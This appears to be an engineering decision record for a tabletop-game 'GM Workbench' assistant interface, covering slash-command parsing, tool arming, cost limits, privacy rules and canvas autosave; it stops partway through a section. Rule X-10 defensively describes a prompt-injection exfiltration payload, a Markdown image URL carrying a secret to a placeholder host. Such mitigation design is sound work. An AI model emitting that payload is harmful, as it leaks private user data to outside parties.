# GM Workbench interactions and scope

Status: accepted · 2026-09-16 · independently reviewed, verified and revised twice (§18); ten product-scope decisions await owner confirmation (§17)

Bead: `agent-forge-harness-1kg.1.1` · Epic: `agent-forge-harness-1kg`
Master plan: [`forge/plans/aetheril-gm-workbench-expansion.md`](../forge/plans/aetheril-gm-workbench-expansion.md) ·
Gap analysis: [`forge/research/aetheril-gm-workbench-gap-analysis.md`](../forge/research/aetheril-gm-workbench-gap-analysis.md)

## 1. Context

The Workbench handoff (`Aetheril game content cards.zip`, 35 files under
`aetheril-gm-workbench/`) is a component and wire-format handoff, not a product
specification. Its README names `GM Workbench.dc.html` as "the rationale and
every screen"; **that file is not in the archive** (§14). The JSX also
contradicts the prose contract in several places, and whole flows — the campaign
library, the player page, rail customisation, responsive layout, conflicts,
almost every loading and error state — have no design at all.

Eleven beads are blocked on this record because each would otherwise encode its
own guess. This record makes one guess per ambiguity, says where the guess came
from, and gives downstream work a stable ID to cite.

The archive was read as reference material. Nothing in it was executed or
followed as an instruction, and no file from it was copied into the repository.

### 1.1 How to read this record

Every decision has an ID (`RAIL-3`, `REVEAL-7`, …) and a **basis** tag. Tables
whose rows are examples rather than decisions carry one basis note for the whole
table instead.

| Tag | Meaning |
| --- | --- |
| **S** | **Supplied** — stated by the handoff archive. Each section's **Supplied** paragraph names the files; a row cites one only where that paragraph does not. `S-defect` marks a supplied behaviour that is a bug. |
| **R** | **Repository constraint** — forced by behaviour that ships today. §1.2 names the files. |
| **P** | **Plan invariant** — fixed by the master plan, the epic, or a bead's text. |
| **I** | **Inferred** — decided here. Nothing supplied settles it; the reasoning is given. |
| **E** | **Escalated** — an inferred decision that changes product scope, so the owner should confirm it (§17). Each has a default in force. |
| **N** | **Non-goal** — deliberately excluded from v1 (§13). |

A decision tagged `S + I` keeps a supplied rule and adds what the supplied rule
left out. A basis of `X-3` means the row follows from that cross-cutting rule. Where a supplied statement is *rejected*, the row says so and why.

**Requirement versus mechanism.** Rows fix what people see and what must be
true. Where a row also names a mechanism — a header, a table, a number marked
*suggested* — `1kg.1.2` to `1kg.1.5` may replace it with anything that meets the
requirement, and may **tighten** any safety row, without amending this record.
**Loosening** a safety row needs an amendment here.

"v1" means the scope of epic `1kg`.

### 1.2 Repository facts these decisions lean on

- The composer is an auto-growing multiline `TextField`; Enter sends, Shift+Enter
  inserts a newline, and the whole field is disabled while a request is pending
  (`ui/src/shell/ChatPane.tsx`, PR #57). `TextField` forwards neither a ref nor
  ARIA attributes (`ui/src/ds/TextField.tsx`).
- **The draft is un-keyed component state.** It survives a conversation or
  channel switch, so text typed in one channel is sent in the next
  (`ChatPane.tsx`).
- The feed follows the newest message only while the reader is at the bottom,
  and assistant prose renders through `components/Markdown.tsx`: `marked` plus
  DOMPurify **with default settings, which keep remote `<img>` tags**. The
  repository sets no Content-Security-Policy.
- `useChat` allows one in-flight request per mounted hook and restores history
  lossily (`ui/src/useChat.ts`).
- A conversation's local title is derived from its first prompt and written to
  `localStorage` (`ui/src/shell/conversationStore.ts`).
- There is no client router. Invite links carry their token in the URL
  **fragment** so it never reaches server logs, and the client strips it from
  the address bar once read ([`invite-auth.md`](invite-auth.md),
  `ui/src/App.tsx`). nginx already falls back to `index.html` on unknown paths;
  FastAPI's static mount does not.
- The shell has no responsive breakpoint: `LeftNav` is a fixed 268 px
  (`ui/src/shell/LeftNav.css`); touch targets already hold a 44 px floor.
- GM mode is enforced server-side for `dm`-role accounts; authorisation fails
  closed with a 503, never an "allowed" (`service/app.py`).
- **Cost guards exist only on `/chat`.** One is 20 requests per user per hour,
  held in memory per instance — so up to 40 at the deployed two instances. The
  other is a *pilot-wide* 500 per day, counted from `role = 'user'` rows in
  `chat.messages` (`config.py`, `service/ratelimit.py`, `service/history.py`).
  A 429 has three sources the client already tells apart: the per-user window
  (with `Retry-After`), the pilot's daily cap (without), and Cloud Run itself
  (`ui/src/api.ts`).
- `ChatRequest.prompt` has **no maximum length** (`service/models.py`).
- Production runs at most 2 instances × 20 concurrent requests with a 300 s
  request timeout (`scripts/deploy.sh`).
- When `RAG_TRACING` is on, Langfuse's callback records prompts and completions
  (`service/tracing.py`).
- Chat export writes JSON (`ui/src/exportChat.ts`) while `ui/README.md` calls it
  Markdown.
- Attachments keep extracted text only and accept `.txt`, `.md`, `.pdf`
  (`service/attachments.py`); they cannot carry audio or images, whatever the
  handoff's `wire-schema.md` suggests.

## 2. Cross-cutting rules

These ten rules came out of the individual decisions. When a later bead meets a
case this record did not foresee, it should resolve it in the direction these
rules point.

| ID | Rule | Basis |
| --- | --- | --- |
| X-1 | **Billable work starts only from an explicit submit with complete input:** Enter or Send in the composer, a `SelectionBar` action on a selection (CANVAS-23), or an explicit retry that resubmits stored input unchanged (RAIL-18, CANVAS-25). A tap on the rail, the More menu, a slash option or a suggestion chip only arms the composer. | P (`1kg.3` design, `1kg.3.3` AC) + I |
| X-2 | **Nothing new reaches a player without an explicit GM action that names what is shown.** Creation, direct edits, AI edits, type defaults and restores never widen exposure. | P (invariant 1) + I |
| X-3 | **Narrowing always wins, in either arrival order.** Stop showing, Stop audio and End session are one action, need no confirmation, are sent at once and never queued, and are retried until acknowledged. Every narrowing advances the session's reveal or audio **epoch** — never a slot sequence, and even when nothing is live — so a widening issued before it is refused (REVEAL-22, AUDIO-28). | S (`RevealSheet.prompt.md`: un-revealing is "one tap") + I |
| X-4 | **Table clients fail closed.** Nothing revealed is cached or persisted. Documents and ambience are withdrawn once the connection has been silent for 10 s. **Documents** are also withdrawn at once when the page is hidden, frozen or restored from the back-forward cache (TABLE-11); audio is not, because a remote player legitimately listens from a background tab (AUDIO-22). A player's device keeps two things only: its session-scoped table credential (REVEAL-19) and, if enrolled, its enrolment credential (AUD-5). | I |
| X-5 | **Workbench work is bounded by the server, not by locking the composer.** At most two tool invocations or AI edits in flight per user (*suggested*) and one AI edit per document; the server refuses more with a 409 naming what is in flight. Plain chat turns are not counted: `/chat` keeps today's one-at-a-time rule per conversation, so its contract does not change. Drafting, arming and navigation are never blocked. | P (`1kg.3.5`, `1kg.4.5` AC; `1kg.4.1`: legacy `/chat` unchanged) + I |
| X-6 | **Save before link.** A generated document is durably stored before its link renders, so never opening it loses nothing. | P (`1kg.4.4`) + I |
| X-7 | **GM-private text never enters web storage, URLs, logs, traces or metric labels** — query strings included, so search text travels in a request body. **Session and enrolment credentials never enter paths, query strings, logs, traces or metric labels**; the one exception `1kg.1.4` may choose is a short-lived, single-asset signed URL under REVEAL-21. Opaque IDs may ride in a URL fragment (CANVAS-30). Credentials deliberately live client-side in three places: the table token in the link's fragment, until it is read and stripped; the session-scoped table credential it is exchanged for (REVEAL-19); and a player's enrolment credential (AUD-5). | P (invariant 10) + R (invite-fragment precedent) + I |
| X-8 | **Unknown is not NPC.** Unknown tool IDs, result kinds, document types and schema versions render a neutral placeholder on the client and fail closed on the server. | P + S-defect (`documentType()` falls back to `npc`) |
| X-9 | **Workbench surfaces exist only in GM mode, for `dm`-role accounts, with a campaign selected.** The one exception is safety: the reveal indicator and the live-audio strip follow the GM into every channel, **as Stop-only controls** (REVEAL-14, AUDIO-31), so what the table sees or hears is never out of sight. Sage, Spell and Rules otherwise behave exactly as today. Uncampaigned GM chat differs in two ways only: the rail renders disabled with its prompt (RAIL-13), and a leading `/` is parsed (SLASH-3). The responsive shell (LAYOUT-7) changes every channel's presentation below 1024 px, not its function. | S (`INTEGRATION.md`: "all of this lives inside the existing `gm` mode") + R + P (invariant 9) + I |
| X-10 | **No Workbench or table surface loads a remote subresource of any kind** — image, media, stylesheet, font or frame. Document fields are plain text in v1, not Markdown. Assistant prose in a lane renders Markdown with images restricted to same-origin asset references. On the table client links are inert and the page is served with a Content-Security-Policy of `default-src 'self'`. Player-safe exports strip remote image syntax. The reason is concrete: a model steered by injected text can emit `![](https://host/?d=<secret>)`, and the shipped Markdown component would fetch it. The same hole in today's channels, and a CSP for the authenticated app, are tracked as `agent-forge-harness-va8`. | R (DOMPurify defaults; no CSP) + I |

## 3. Tool-rail tap and brief entry

**Supplied.** `ToolRail` calls `onTool(tool)` with the tool and nothing else;
the usage note wires it straight to `runTool`. `wire-schema.md` says the brief is
"whatever followed the slash command or the rail tap" without saying how
anything follows a tap. The lane's suggestion example calls `runTool(s.id)`,
again with no brief. The lane examples also show a *conversational* GM message
producing a tool-badged result, which implies the assistant chooses tools from
natural language. (`patterns.md` speaks of adding "a ninth tool"; the registry
already holds ten.) **Plan.** "Rail taps populate a command/brief rather than
executing an empty request" (`1kg.3`); "tapping a tool never fires an empty
billable request" (`1kg.3.3`).

### 3.1 Decisions

| ID | Decision | Basis |
| --- | --- | --- |
| RAIL-1 | A tap **arms the composer**; it never invokes. Arming writes the tool's canonical command and one space (`/npc `) into the draft as plain text, focuses the composer and puts the caret at the end. | P + I (rejects the supplied `onTool={runTool}`) |
| RAIL-2 | There is **one path to an invocation**: the slash parser (§4) reading the draft on submit. Rail, More, slash menu and suggestion chips all converge on it, so the three surfaces cannot disagree about what runs. Plain text was chosen over a rich "chip token" because the composer is a native textarea and a second input model would need its own keyboard and screen-reader contract. The assistant never decides by itself to run a tool from a conversational message: that would be billable work nobody submitted (X-1). A chat answer may instead carry suggestion chips (RAIL-8). | S (one registry, three surfaces) + I (rejects the natural-language routing the examples imply) · **E-9** |
| RAIL-3 | While the draft parses as a known command, an **armed-tool row** sits above the field: the tool icon, label and blurb, plus a hint (`Describe it, then press Enter`). The Send button's accessible name becomes `Run <label> tool`. The row is status text, not a control. | I |
| RAIL-4 | Arming never discards typed text (table 3.2). | I |
| RAIL-5 | Every tool declares a **brief policy** in the registry: `required` or `optional`. Only `recap` is `optional` in v1 (table 3.3). Submitting a `required` tool with an empty brief does nothing billable and shows the inline hint `Describe what you want — for example: /npc the hooded stranger at the bar`. | I |
| RAIL-6 | A brief is 1–2,000 characters after trimming (0 allowed when `optional`), and **an AI-edit instruction shares that bound** (CANVAS-21). The client blocks over-length submits with a counter; the server rejects them **before** any provider call. Per-type field and whole-document size caps are validated before provider work too (`1kg.5.3`, `1kg.5.5`), so a pasted megabyte of notes is not re-sent on every edit. `/chat` has no prompt bound today; that is tracked as `agent-forge-harness-764` rather than folded into the tool API. | I + R |
| RAIL-7 | The client sends **no free-form context**. The handoff's `context: { session, scene }` object is rejected: the server assembles context from authorised campaign, conversation and session state. A request may carry typed references only (for example the timeline entry a suggestion came from). Schema is `1kg.1.2`'s. | I (rejects S) |
| RAIL-8 | A **suggestion chip arms the composer** with its target command, an optional server-supplied prefilled brief of at most 200 characters, and a reference to the source result. It does not run. The GM edits if they wish and presses Enter. Suggestions whose target is not an enabled registry tool are dropped server-side and never rendered. At most three render. | S (three max) + P (validated targets) + I |
| RAIL-9 | The stored GM turn is **structured** — `tool_id` plus `brief` — never the raw slash string. The thread renders the brief as the GM's turn with the tool's label as a badge; an empty optional brief renders the tool's blurb in italics. | I |
| RAIL-10 | **Capability-disabled tools stay visible.** In the slash menu and More they render `aria-disabled` with a reason (`Image generation isn't set up yet.`). They cannot be armed or newly pinned. A stored pin that later becomes disabled keeps its place, renders disabled and still counts toward five, so re-enabling restores the rail unchanged. | P (`1kg.3.1` AC: "render honestly") + I |
| RAIL-11 | **Pins** are an ordered list of 0–5 unique, known tool IDs. A tool must be enabled at the moment it is pinned. *Absent* means "use `DEFAULT_PINNED`"; an *empty list* means the GM deliberately emptied the rail, which then shows only More and the hint. Unknown IDs are dropped on read. No back-filling. | S (five, order preserved) + I |
| RAIL-12 | Pins are stored **per account, per device** in `localStorage`, the same posture as display name and avatar tone today. They contain tool IDs only. Server-synced preferences belong to epic `1ka`. | R + I · **E-7** |
| RAIL-13 | Without a selected campaign the rail renders disabled with `Choose or create a campaign to use GM tools` and a button that opens campaign selection. Uncampaigned GM conversations keep working as plain chat. | P (legacy conversations stay readable) + I |
| RAIL-14 | A plain GM-mode message (no command) is still an ordinary chat turn answered by the assistant, exactly as today; its answer renders in the assistant lane. Narration-only turns that the assistant does not answer are not in v1. | R + N · **E-5** |
| RAIL-25 | **A draft, an armed tool and an armed edit belong to their conversation.** Switching conversation or channel never carries them along; each conversation keeps its own draft in memory and gets it back when the GM returns. Today the draft is un-keyed, so `/npc <brief>` typed in the GM channel would be sent verbatim as a Sage question after a channel switch. | R + I |
| RAIL-26 | **A campaign conversation never derives a stored client-side title from a prompt or a brief.** Today the first prompt becomes a `localStorage` title, which would put a GM's brief in web storage (X-7). Until `1kg.2.4` moves titles to the server, a campaign conversation's local title is neutral (`GM thread · <date>`). Uncampaigned conversations keep today's behaviour. | R + I |

### 3.2 Arming the composer

Basis for the whole table: I.

| Draft before the tap | Draft after tapping **NPC** | Notes |
| --- | --- | --- |
| empty or whitespace | `/npc ` | caret at end |
| `the hooded stranger` | `/npc the hooded stranger` | existing text becomes the brief |
| `/monster a drowned thing` | `/npc a drowned thing` | only the command token is replaced |
| `/mon` (menu open) | `/npc ` | the partial token is replaced; the menu closes |
| `/foo bar` (unknown command) | `/npc bar` | the unknown token is replaced |
| `make her older`, with an edit armed | `/npc make her older` | the edit target is cleared and that is announced (CANVAS-22) |
| anything, while other operations are in flight | armed as above | arming is never blocked; only the server's cap can block a submit (RAIL-16) |

### 3.3 The ten tools

Basis: commands, labels, icons, blurbs, result kinds and the default five pins
are **S** (`tools/toolRegistry.js`). Brief policy, working labels, the `/hooks`
alias and the v1 defaults are **I**.

| Tool | Command | Brief | Lands as | Working label | v1 default |
| --- | --- | --- | --- | --- | --- |
| `npc` | `/npc` | required | document, canvas (§5) | Writing the dossier… | on after evals |
| `monster` | `/monster` | required | card, with **Save to Bestiary** | Building the stat block… | on after evals |
| `loot` | `/loot` | required | card | Rolling treasure… | on after evals |
| `names` | `/names` | required | card | Gathering names… | on after evals |
| `rules` | `/rules` | required | card, cited | Checking the rules… | on after evals |
| `portrait` | `/portrait` | required | media card | Painting… | **off** — no provider approved |
| `encounter` | `/encounter` | required | document | Balancing the encounter… | on after evals |
| `hooks` | `/hook`, alias `/hooks` | required | card | Finding hooks… | on after evals |
| `recap` | `/recap` | optional — the brief is a focus instruction | document (`session-notes`) | Recapping the session… | on after evals |
| `map` | `/map` | required | media card | Sketching the map… | **off** — no provider approved |

"On after evals" restates the plan's rule: no tool is enabled by default below
its `1kg.4.6` quality threshold. `hooks` is `required` because campaign
retrieval is still a stub (`StubSecondaryRetriever`), so an empty brief could
only produce generic output. `recap` reads the current conversation from the
most recent session-start divider, or from its beginning if there is none,
capped by `1kg.4.4`; with nothing to recap it fails before provider work with
`Nothing to recap yet.` Because v1 has no player turns (E-5), that conversation
is the GM's private thread — which is why a recap is never pre-ticked for
reveal (REVEAL-23).

### 3.4 Invocation lifecycle

The handoff's lane has three statuses: `working`, `done`, `error`. This record
adds `cancelled`, as an intentional extension of `AssistantLaneProps.status`,
and a client-only `unknown`.

| ID | State | What the GM sees | Actions | Basis |
| --- | --- | --- | --- | --- |
| RAIL-15 | `working` | Tool badge, three-dot indicator, the tool's working label in a polite live region. After 30 s the label becomes `Still working…`. **No children render**, so a stale result can never sit under a working header. | **Cancel** | S (statuses, dots, label) + P (`1kg.3.2`: no stale children) + I |
| RAIL-16 | the composer meanwhile | **Never disabled.** The GM can type, arm and submit; each operation owns its lane, so results land beneath their own turns in whatever order they finish. Send is unavailable in two cases only: a *plain chat turn* is pending in this conversation (today's `/chat` rule), or the client knows the Workbench cap is reached — then it reads `Waiting for a tool to finish…`. The server is what enforces the cap (X-5): a submit from another tab gets the 409 and shows the same message. | — | P (`1kg.3.5`: pending work "cannot lock unrelated composer actions") + I |
| RAIL-17 | `done` | Prose through the `Markdown` component under X-10's restrictions, in the lane's sans face; then the card, document link or media card; then up to three suggestions. Announced once: `<label> finished`. | Suggestions; card actions | S + R + I |
| RAIL-18 | failed, retryable — the server *reported* a failure (5xx, 503, a provider timeout, a platform 429), or the request never left the browser | Error rule, icon and a plain message. **No children render.** A response that was *lost* is not this state but RAIL-21, because the run may still be going. | **Try again** re-sends the *same* invocation ID. The server answers by state: still working — it reports status and starts nothing; done — it replays the stored result, free; failed — it starts a new attempt, which passes the cost guards again. | P (`1kg.4.1`: idempotent retry) + I |
| RAIL-19 | failed, final (4xx validation, tool disabled, brief too long) | The server's bounded message. | **Edit brief** re-arms the composer with the original command and brief | I |
| RAIL-20 | throttled (429) | Three cases, matching what the client already tells apart. **Per-user window:** `That's a lot at once — try again <when>`, from `Retry-After`. **Pilot daily cap:** `The pilot's daily limit is spent. It resets overnight.` with no retry offered. **Unmarked (the platform):** treated as RAIL-18. | per case | R + I |
| RAIL-21 | `unknown` — client-only: the response was lost, the client waited past 120 s, or a stored `working` entry was hydrated after a reload | `Checking on <label>…` The client polls status by ID and **never re-runs by itself**. The operation still counts against the cap (X-5) until a terminal state is known. | **Check again**; **Cancel** | I |
| RAIL-22 | `cancelled` | Muted `Cancelled.` line. | **Run again** arms the composer with the same command and brief | I |
| RAIL-23 | cancel semantics | Cancel shows `Cancelling…` until the server reports a terminal state, and keeps its place under the cap meanwhile — the provider call may still be running and billing. If the provider had already finished, the result is **kept and shown** with `Finished before it could be cancelled`. A cancelled invocation never creates a document. | — | P (`1kg.4.1`: cancellation contract) + I |
| RAIL-24 | unknown result on hydration | Neutral placeholder: `This result was made by a newer version of Aetheril.` Never a crash, never an NPC (X-8). | — | P + I |
| RAIL-27 | a stuck invocation | The server expires an invocation that has made no progress for 150 s (*suggested*; it must sit under the 300 s request timeout) into a retryable failure, so a dead worker cannot leave a lane working for ever. **An expired or superseded attempt is fenced**: only the attempt the server currently recognises may complete, so a slow attempt's late result is discarded rather than saved as a second document. | as RAIL-18 | P (`1kg.4.4`: exactly one document) + I |

## 4. Slash-command parsing and keyboard interaction

**Supplied.** `SlashMenu` renders "while the draft starts with `/`", fed by
`matchCommand(draft)`, a prefix match on command and label. `activeIndex` is a
prop with no keyboard handling behind it; the active row shows a `↵` glyph, and
the usage note wires `onPick` straight to `runTool`. The menu is a `listbox` of
`<button role="option">`, and returns `null` on zero matches. **Defects.**
`matchCommand` receives the whole draft, so the first space after a command
empties the match list; nothing turns `/npc a brief` into a tool and a brief;
`/hook` is the command for the tool whose ID and label are `hooks`.

### 4.1 Grammar

```
draft    = [ws] "/" token [ ws+ brief ]
token    = the maximal run of non-whitespace after "/"; it may be empty
           a token can name a command only if it is ALPHA *31( ALPHA / DIGIT / "-" ),
           compared case-insensitively
brief    = everything after the first whitespace run following the token, trimmed;
           may contain newlines and further "/" characters
escape   = [ws] "//" rest        ; sends "/" + rest as a plain chat message
```

| ID | Decision | Basis |
| --- | --- | --- |
| SLASH-1 | A command is recognised only when `/` is the **first non-whitespace character of the draft**. A slash anywhere else — `AC 15/16`, `and/or`, a URL — is text. | I |
| SLASH-2 | The token is matched **exactly**, case-insensitively, against each registry `command` and its declared `aliases`. Prefix matching is for the menu only, never for execution. The registry validator rejects any collision across commands and aliases. | S-defect + P (`1kg.3.1` AC) + I |
| SLASH-3 | Commands exist **only in GM mode**. In Sage, Spell and Rules a leading `/` is ordinary text, as today. In GM mode a leading `/` is a command **even with no campaign selected**: a known command then answers `Choose or create a campaign to use GM tools` and sends nothing. That is the one way uncampaigned GM chat differs from today. | R + X-9 + I |
| SLASH-4 | An **unknown command is never sent** — not as a tool, and not as chat. The draft stays and the composer shows `Unknown tool "/foo". Type / to see every tool, or start with // to send this as a message.` Sending it to GM chat would turn the typo `/npcs` into a billable surprise. | I |
| SLASH-5 | `//` at the start is the escape hatch: `//roll with it` sends `/roll with it` as a plain message. | I |
| SLASH-6 | The parser is one pure function of the draft text, shared by menu, armed-tool row and submit. It returns exactly one of: `plain`; `escaped`; `partial` (no whitespace after the token yet — it carries the exact tool match when the token already equals a command or alias); `command` (whitespace seen, known tool, brief possibly empty); or `unknown` (whitespace seen, no such tool). It is switched off while an edit is armed (CANVAS-22). | I |

### 4.2 Parse outcomes

Basis for the whole table: I.

| Draft (GM mode) | Outcome | On Enter |
| --- | --- | --- |
| `what does she want?` | `plain` | chat turn |
| `AC 15/16 seems high` | `plain` | chat turn |
| `/` | `partial("")` — menu lists every tool | accepts the active option; nothing is sent |
| `/mo` | `partial("mo")` — menu lists Monster | accepts Monster: draft becomes `/monster ` |
| `/recap` | `partial("recap")`, exact match | menu open: accepts, and the draft becomes `/recap `. Menu dismissed with Escape: runs as `command(recap, "")` |
| `/recap ` | `command(recap, "")` — brief optional | invokes |
| `/npcs` | `partial("npcs")`, no match; the menu shows its no-match row | unknown-tool error; nothing is sent |
| `/1d20+5` | `partial("1d20+5")`; the token cannot name a command | unknown-tool error, which mentions `//` |
| `/recap`, newline, `focus on the heist` | `command(recap, "focus on the heist")` | invokes |
| `/MONSTER ` | `command(monster, "")` — brief required | inline hint; nothing is sent |
| `/monster CR 5, drowned` | `command(monster, "CR 5, drowned")` | invokes |
| `/hooks a missing heir` | `command(hooks, …)` through the alias | invokes |
| `/foo bar` | `unknown("foo")` | inline error; nothing is sent |
| `//shrug` | `escaped("/shrug")` | chat turn |
| `/portrait Ondrey` while the tool is disabled | `command(portrait, …)`, disabled | inline reason; nothing is sent |
| `/npc the ferryman` with no campaign selected | `command(npc, …)` | `Choose or create a campaign to use GM tools`; nothing is sent |

### 4.3 Menu state

| ID | Decision | Basis |
| --- | --- | --- |
| SLASH-7 | The menu is **open** while the parse is `partial`, the composer has focus, and the menu has not been dismissed for the current token text. | S + I |
| SLASH-8 | It **closes** when whitespace follows the token, on Escape, on blur or an outside click, on a pick, or when the draft stops beginning with `/`. After Escape it stays closed until the token text changes. | I |
| SLASH-9 | Options are the registry entries whose command, alias or label starts with the typed token, in registry order. Zero matches render one inert row, `No tool matches "/xyz"`, instead of vanishing. | S (prefix on command and label) + I (rejects the `null` render) |
| SLASH-10 | Disabled tools are listed, can become the active option so a screen reader can reach the reason, and cannot be accepted. | P + I |

### 4.4 Keyboard

Focus stays in the composer throughout. The menu is driven through
`aria-activedescendant`, never by moving focus into it. Basis for the table: I,
except that Enter accepting the active option is S (the `↵` glyph).

| Key | Menu open, with an acceptable active option | Menu closed — or open with nothing acceptable (no match, or a disabled tool) |
| --- | --- | --- |
| ArrowDown / ArrowUp | next / previous option, wrapping | native caret movement |
| Home / End | first / last option | native caret movement |
| Enter | **accept** the active option: the token becomes the canonical command plus a space, and the menu closes. Never submits. | submit (§4.2) |
| Tab | accept, the same as Enter | native focus movement |
| Shift+Enter | newline, which closes the menu | newline |
| Escape | close the menu and keep the draft | clears an armed edit target if there is one; never the draft |
| Pointer on an option | accept; `mousedown` is prevented so the composer keeps focus. Hover moves the active option. | — |
| Any key during IME composition | not intercepted | not intercepted |

| ID | Decision | Basis |
| --- | --- | --- |
| SLASH-11 | **Enter never both picks and submits.** `/recap` typed with the menu still open takes two presses: one completes the command, one runs it. This is the keyboard form of X-1. | S (Enter picks) + I (rejects the supplied `onPick={runTool}`) |
| SLASH-12 | Options are non-focusable elements with `role="option"` inside a `role="listbox"`, not buttons. The textarea keeps its native role and carries `aria-autocomplete="list"`, `aria-controls` and `aria-activedescendant`; a `textarea` takes no explicit role, so there is no `combobox` and no `aria-expanded`. Because a plain textbox announces its active descendant unreliably, a debounced polite live region announces the option count **and** the active option's label, blurb and any disabled reason. `TextField` must first learn to forward a ref and ARIA attributes. If the screen-reader pass still fails, `1kg.3.3` may move focus into the listbox by amending this row. | I |

### 4.5 More menu and rail customisation

| ID | Decision | Basis |
| --- | --- | --- |
| SLASH-13 | **More** is a menu button (`aria-haspopup="menu"`, `aria-expanded`). Opening moves focus to the first item. Arrow keys wrap; Home and End jump; Enter or Space activates; Escape, Tab and an outside click close it. Closing without a pick returns focus to the More button. A pick arms the composer and moves focus **to the composer**, because typing the brief is the next step. | S (menu roles) + P (`1kg.3.3` AC) + I |
| SLASH-14 | More lists the unpinned tools by blurb, then a separator, then **Customise rail…**. | S |
| SLASH-15 | **Customise rail** is a modal dialog listing **every** tool with a pin toggle and Move up / Move down buttons. Reordering is never drag-only. A disabled tool can be unpinned but not pinned. At five pins the remaining toggles are disabled with `Unpin one to add another`. It offers Reset to defaults, Save and Cancel. Escape cancels, and focus returns to the More button. On narrow screens it is a full-screen sheet. | S (five) + I |

## 5. Persistent canvas: collisions and unsaved changes

**Supplied.** The canvas "opens on the right and stays until dismissed. A new
topic in chat never swaps or closes it. One document at a time; switching
happens in the campaign library" (`patterns.md` §4). A `document` result "opens
the canvas" (§3). Direct edits are `contentEditable` paragraphs that commit on
blur; `changedFields` are "washed gold until the next turn". "All of this lives
inside the existing `gm` mode" (`INTEGRATION.md`). **Contradiction.** A result
that opens the canvas is an implicit swap whenever a document is already open.
**Missing.** Save states, validation, conflicts, what "unsaved" means, how a
chat message becomes a document edit, and reload behaviour.

### 5.1 Opening and collisions

| ID | Situation | Behaviour | Basis |
| --- | --- | --- | --- |
| CANVAS-1 | Canvas closed; a **new-document** result arrives **live**, in the conversation on screen, on the wide layout (§10) | The document opens in the canvas. This is the only implicit open. Focus stays in the composer; a polite announcement says `Opened <title> in the canvas`. The link row renders as well, so plan invariant 3 ("document results link to the canvas") holds in every case. | S (a document result opens the canvas) + I (the four conditions) |
| CANVAS-2 | Canvas closed; medium or narrow layout | No auto-open — a full-width takeover would hide the chat the GM is using. The link row renders and a toast offers **Open**. | I |
| CANVAS-3 | Canvas **open on another document**, clean or dirty | **Never swaps.** The lane shows `AssistantDocumentLink` reading `<kind> · saved to <category>` with the action **Open in canvas**. | S ("never swaps") + I |
| CANVAS-4 | Result hydrated from history, or arriving for a conversation the GM has left; **any AI-edit result** | Never auto-opens. An edit result updates an open canvas in place; otherwise it is a link. | I |
| CANVAS-5 | GM activates a link or library row for the document already open | No swap. Focus moves to the canvas title. | I |
| CANVAS-6 | GM activates a link or library row for a different document; canvas clean | Replaces immediately, no confirmation. Focus moves to the canvas title. A chat link and a library row are equivalent explicit switch gestures. | S (switching is explicit) + I |
| CANVAS-7 | The same, canvas dirty | The loss guard runs first (§5.3). | P (`1kg.6.3` AC) + I |
| CANVAS-8 | A queue of waiting documents | **Rejected.** X-6 means every generated document is already saved and linked from its lane, so the link *is* the queue. A queue would add state without adding safety. | I |
| CANVAS-9 | GM switches channel (Sage, Spell, Rules) | **The canvas hides with the GM channel and returns with it**, still open on the same document; the library panel, the Participants panel and the Chat / Canvas switch hide with it. Because the canvas is only hidden, the guard just flushes, and if that fails it offers **Keep editing** or **Switch anyway** — drafts stay in memory and nothing is discarded. Sage, Spell and Rules therefore keep today's layout (apart from LAYOUT-7 below 1024 px). The reveal indicator and the live-audio strip stay visible in every channel (X-9). `/rules` exists so that a GM need not leave the GM channel for a lookup. | S (`INTEGRATION.md` gating) + I |

### 5.2 Save model

| ID | Decision | Basis |
| --- | --- | --- |
| CANVAS-10 | **Autosave per field.** A changed field commits on blur, after 1,500 ms idle, or on Ctrl/Cmd+S. There is no document-level Save button. Each commit is a field patch carrying the document's base **write revision** (CANVAS-34), recorded with `author: gm`. **Saves are serialised per document — one patch in flight.** A field edited while it is `saving` returns to `editing` when the save resolves, and its next patch carries the revision that save returned. A save response never overwrites newer local text. | S (blur commit, `author: gm`) + I |
| CANVAS-11 | Editable fields are **labelled native controls**, not bare `contentEditable`. How the read and edit presentations swap is `1kg.6.2`'s; structured fields (lists, ability scores, stat-block entries) get structured editors and are never flattened to a string. Field text is plain text (X-10). | P (`1kg.6.2` AC) + I |
| CANVAS-12 | A field is in exactly one state: `clean`, `editing`, `saving`, `saved`, `error` or `conflict`. **Dirty** means any field that is `editing` with a changed value, `saving`, `error` or `conflict`. | I |
| CANVAS-13 | The canvas header carries one aggregate status in a polite live region: `Saved`, `Saving…`, `Unsaved changes`, `Couldn't save — Retry`, or `Conflict — review`. | I |
| CANVAS-14 | Field validation errors from the server attach to their field and keep the GM's text. A failed save never reverts what was typed. | P (`1kg.6.5` AC) + I |
| CANVAS-15 | **Drafts live in memory only.** They are not mirrored to `localStorage` or `sessionStorage`, because they are GM-private text (X-7). `beforeunload` protects a dirty canvas against reload. | I |
| CANVAS-34 | **History and concurrency are different things.** *Concurrency:* every committed write advances the document's **write revision**, and each field remembers the revision that last changed it; patches carry the revision they were based on, which is what CANVAS-19 compares. A history version number is never a concurrency token. *History:* a burst of GM autosaves reads as one entry and must not store one whole-document snapshot per pause. Recommended: autosaves accumulate in one open `gm` working version, sealed by ten minutes idle, by closing or switching the canvas, by the start of an AI edit, by a restore, or by another author's write. **Opening the reveal sheet or an export dialog seals it first**, so what is pinned or exported is exactly the immutable version that was displayed. This reads plan invariant 5 as "*sealed* versions are append-only". `1kg.5.1` may group at display time instead, provided storage stays bounded. | P (refined) + I |

### 5.3 The loss guard

The guard first **flushes**: it tries to save pending edits immediately, waiting
at most 5 s (*suggested*). Because saving is automatic, most dirty state is
merely un-flushed, and a successful flush proceeds with no dialog. A dialog
appears only when the flush fails, times out, or a conflict is unresolved:
`You have unsaved changes to <title>` with **Keep editing** (default focus),
**Try saving again** (when retryable) and **Discard changes** (destructive).
**The guard never discards for a destination that cannot load**: the target is
fetched first, and while offline a switch is simply refused. Nothing is lost
silently.

| ID | Trigger | Guarded | Basis |
| --- | --- | --- | --- |
| CANVAS-16 | Replace the document; close the canvas; **switch channel**; switch campaign (including by opening a conversation that belongs to another campaign); sign out; leave the workspace screen; restore a version; start an AI edit on this document; start a reveal or an export; a fragment change made outside the app | yes — flush, then dialog if needed | P (`1kg.6.3`: "unsaved edits block accidental loss") + I |
| CANVAS-17 | Reload or close the tab | browser `beforeunload` prompt while dirty | I |
| CANVAS-18 | Switch conversation inside the same campaign; open the library; send chat; run a tool | no — none of these touch the canvas | I |

### 5.4 Conflicts and concurrent AI edits

| ID | Decision | Basis |
| --- | --- | --- |
